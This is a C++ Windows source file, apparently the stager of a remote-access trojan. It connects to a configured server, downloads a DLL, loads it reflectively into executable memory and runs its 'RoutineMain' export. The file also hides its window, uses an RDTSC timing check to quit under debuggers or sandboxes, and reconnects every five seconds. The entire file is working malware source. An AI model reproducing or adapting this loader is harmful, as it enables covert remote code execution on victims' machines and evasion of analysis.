
#include "stdafx.h"
#include "windows.h"
#include <winsock2.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98")

#include "MemLoadDll.h"

// 配置远程主机信息
CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA(LOCAL_HOST, DEFAULT_PORT);

// 从域名获取IP地址
inline const char* GetIPAddress(const char* hostName)
{
    struct hostent* host = gethostbyname(hostName);
#ifdef _DEBUG
    Mprintf("此域名的IP类型为: %s.\n", NULL == host ? "IPV4" : host->h_addrtype == AF_INET ? "IPV4" : "IPV6");
    for (int i = 0; host ? host->h_addr_list[i] : 0; ++i)
        Mprintf("获取的第%d个IP: %s\n", i + 1, inet_ntoa(*(struct in_addr*)host->h_addr_list[i]));
#endif
    if (host == NULL || host->h_addr_list == NULL)
        return "";

    static char addr[100] = {};
    strcpy_s(addr, host->h_addr_list[0] ? inet_ntoa(*(struct in_addr*)host->h_addr_list[0]) : "");
    return addr;
}

DWORD _stdcall ConnectThread(LPVOID lParam)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

    struct sockaddr_in ServerAddr;
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = htons(modify_data.ServerPort);
    const char *server = ('0' <= modify_data.ServerAddr[0] && modify_data.ServerAddr[0] <= '9')
                         ? modify_data.ServerAddr : GetIPAddress(modify_data.ServerAddr);

    ServerAddr.sin_addr.S_un.S_addr = inet_addr(server);

    SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (connect(MainSocket, (PSOCKADDR)&ServerAddr, sizeof(sockaddr_in)) == SOCKET_ERROR) {
        Mprintf("Can't Connect to Dll Server: %s:%d\n", modify_data.ServerAddr, modify_data.ServerPort);
        if (MainSocket != INVALID_SOCKET) {
            closesocket(MainSocket);
            MainSocket = INVALID_SOCKET;
        }
        return 0;//connect error
    } else {
        TurnonKeepAlive(MainSocket, 120);
    }

    MsgHead msgHead;
    msgHead.dwCmd = SOCKET_DLLLOADER;
    msgHead.dwSize = 0;

    if (!SendMsg(MainSocket, NULL, &msgHead)) {
        Mprintf("Loader Request Can't Send\n");
        closesocket(MainSocket);
        return 1;
    }

    if (!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead))) {
        Mprintf("Can't Recv Dll Data Head\n");

        return 1;
    }

    char *buf = (char *)VirtualAlloc(NULL, msgHead.dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!RecvData(MainSocket, buf, msgHead.dwSize)) {
        Mprintf("Can't Recv Dll Data\n");

        return 1;
    }

    shutdown(MainSocket, 0x02);
    closesocket(MainSocket);

    int Err;

    if (msgHead.dwCmd == CMD_DLLDATA) {
        HMEMORYMODULE hModule;

        hModule = MemoryLoadLibrary(buf);
        VirtualFree(buf, msgHead.dwSize, MEM_DECOMMIT);

        if (hModule == NULL) {
            Mprintf(_T("Load Dll Err\n"));

            return 2;
        }

        typedef BOOL(WINAPI*_RoutineMain)(LPVOID lp);

        _RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
        Err = RoutineMain((LPVOID)&modify_data);
        MemoryFreeLibrary(hModule);
    } else {
        VirtualFree(buf, msgHead.dwSize, MEM_DECOMMIT);
        return 2; //Recv Msg is not a dll info
    }

    return Err;
}

#ifdef _DEBUG
int main() // 调试模式下为控制台程序
{
#else
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
                                L"#32770",
                                L"WindowsNet",
                                WS_OVERLAPPEDWINDOW,
                                0,
                                0,
                                100,
                                100,
                                HWND_DESKTOP,
                                NULL,
                                GetModuleHandleW(0),
                                NULL
                               );
	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);

    /*
    这段代码的核心功能是测量两次 RDTSC 之间的 CPU 时钟周期差，并根据结果决定程序的运行状态：
    时间差小于 255（时钟周期）：跳转到 OK，程序继续运行。
    时间差大于或等于 255：调用 ExitProcess，退出程序，返回码为 0。
    */
    _asm {
        RDTSC
        xchg    ecx, eax
        RDTSC
        sub     eax, ecx
        cmp     eax, 0FFh
        jl      OK
        xor     eax, eax
        push    eax
        call    ExitProcess
    }
OK:
#endif
    OutputDebugStringA(">>> Program start RUN \n");

    GetInputState();
    PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);

    WSADATA lpWSAData;
    WSAStartup(MAKEWORD(2, 2), &lpWSAData);

    while (1) {
        __try {
            if (ConnectThread(NULL) == -1) {
                Mprintf("Client exit normally\n");
                break;
            }
            Sleep(5000);
        } __except (1) {
            Mprintf("ConnectThread Exception\n");
        }
    }

    WSACleanup();
    OutputDebugStringA(">>> Program stop RUN \n");

    return 0;
}
